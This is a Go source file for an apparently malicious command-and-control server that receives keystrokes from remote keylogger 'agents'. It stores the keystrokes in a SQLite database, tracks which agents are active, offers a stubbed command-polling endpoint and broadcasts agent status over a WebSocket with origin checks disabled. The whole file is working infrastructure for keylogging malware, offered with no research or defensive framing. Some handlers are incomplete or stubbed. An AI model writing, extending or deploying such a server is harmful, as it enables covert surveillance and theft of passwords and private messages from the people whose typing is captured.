package main

import (
	"database/sql"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
	_ "modernc.org/sqlite"
)

var (
	listenAddr = ":8080"
	dbPath     = "keystrokes.db"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
)

type Keystroke struct {
	Key      uint32 `json:"key"`
	Unicode  string `json:"unicode"`
	Alt      bool   `json:"alt"`
	Ctrl     bool   `json:"ctrl"`
	Shift    bool   `json:"shift"`
	Extended bool   `json:"extended"`
	Time     int64  `json:"time"`
}

type Agent struct {
	ID        string    `json:"id"`
	Status    string    `json:"status"`
	LastSeen  time.Time `json:"lastSeen"`
	Uptime    int64     `json:"uptime"`
}

type Server struct {
	db         *sql.DB
	agents     map[string]*Agent
	clients    map[*websocket.Conn]bool
	broadcast  chan []byte
	register   chan *websocket.Conn
	unregister chan *websocket.Conn
	mu         chan struct{}
}

func NewServer() *Server {
	return &Server{
		agents:     make(map[string]*Agent),
		clients:    make(map[*websocket.Conn]bool),
		broadcast:  make(chan []byte),
		register:   make(chan *websocket.Conn),
		unregister: make(chan *websocket.Conn),
		mu:         make(chan struct{}, 1),
	}
}

func (s *Server) initDB() error {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return err
	}
	s.db = db

	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS keystrokes (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			agent_id TEXT,
			key_code INTEGER,
			unicode_text TEXT,
			alt BOOLEAN,
			ctrl BOOLEAN,
			shift BOOLEAN,
			extended BOOLEAN,
			timestamp INTEGER
		)
	`)
	if err != nil {
		return err
	}

	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS agents (
			id TEXT PRIMARY KEY,
			status TEXT,
			last_seen INTEGER,
			uptime INTEGER
		)
	`)
	return err
}

func (s *Server) handleData(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}
	r.Body.Close()

	agentID := fmt.Sprintf("%v", payload["id"])
	encrypted := fmt.Sprintf("%v", payload["encrypted"])
	ts := int64(payload["ts"].(float64))

	_, err := s.db.Exec(
		"INSERT INTO keystrokes (agent_id, key_code, unicode_text, alt, ctrl, shift, extended, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
		agentID, 0, encrypted, false, false, false, false, ts,
	)
	if err != nil {
		log.Printf("DB insert error: %v", err)
	}

	s.mu <- struct{}{}
	if a, ok := s.agents[agentID]; ok {
		a.LastSeen = time.Now()
		a.Status = "active"
	} else {
		s.agents[agentID] = &Agent{
			ID:       agentID,
			Status:   "active",
			LastSeen: time.Now(),
		}
	}
	<-s.mu

	s.broadcastData("status", agentID)

	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func (s *Server) handleCommands(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("id")
	s.mu <- struct{}{}
	agent := s.agents[agentID]
	<-s.mu

	if agent == nil {
		json.NewEncoder(w).Encode(map[string]string{})
		return
	}
	json.NewEncoder(w).Encode(map[string]string{})
}

func (s *Server) handleStatus(w http.ResponseWriter, r *http.Request) {
	s.mu <- struct{}{}
	agents := make([]*Agent, 0, len(s.agents))
	for _, a := range s.agents {
		agents = append(agents, a)
	}
	<-s.mu

	json.NewEncoder(w).Encode(map[string]interface{}{"agents": agents})
}

func (s *Server) handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WS upgrade error: %v", err)
		return
	}
	defer conn.Close()

	s.register <- conn

	go func() {
		for {
			_, _, err := conn.ReadMessage()
			if err != nil {
				s.unregister <- conn
				return
			}
		}
	}()
}

func (s *Server) broadcastData(typ string, agentID string) {
	msg := map[string]interface{}{"type": typ, "agentId": agentID}
	data, _ := json.Marshal(msg)
	s.broadcast <- data
}

func (s *Server) run() {
	go func() {
		for {
			select {
			case conn := <-s.register:
				s.clients[conn] = true
			case conn := <-s.unregister:
				if s.clients[conn] {
					delete(s.clients, conn)
					conn.Close()
				}
			case data := <-s.broadcast:
				for conn := range s.clients {
					go func(c *websocket.Conn, d []byte) {
						c.WriteJSON(string(d))
					}(conn, data)
				}
			}
		}
	}()

	http.HandleFunc("/api/v1/agent/data", s.handleData)
	http.HandleFunc("/api/v1/agent/commands", s.handleCommands)
	http.HandleFunc("/api/v1/agent/status", s.handleStatus)
	http.HandleFunc("/ws", s.handleWS)
	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("OK"))
	})

	log.Printf("Server listening on %s", listenAddr)
	log.Fatal(http.ListenAndServe(listenAddr, nil))
}

func main() {
	listen := flag.String("listen", listenAddr, "listen address")
	db := flag.String("db", dbPath, "database path")
	flag.Parse()

	listenAddr = *listen
	dbPath     = *db

	s := NewServer()
	if err := s.initDB(); err != nil {
		log.Fatalf("Failed to init DB: %v", err)
	}
	defer s.db.Close()

	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-ch
		log.Println("Shutting down...")
		s.db.Close()
		os.Exit(0)
	}()

	s.run()
}
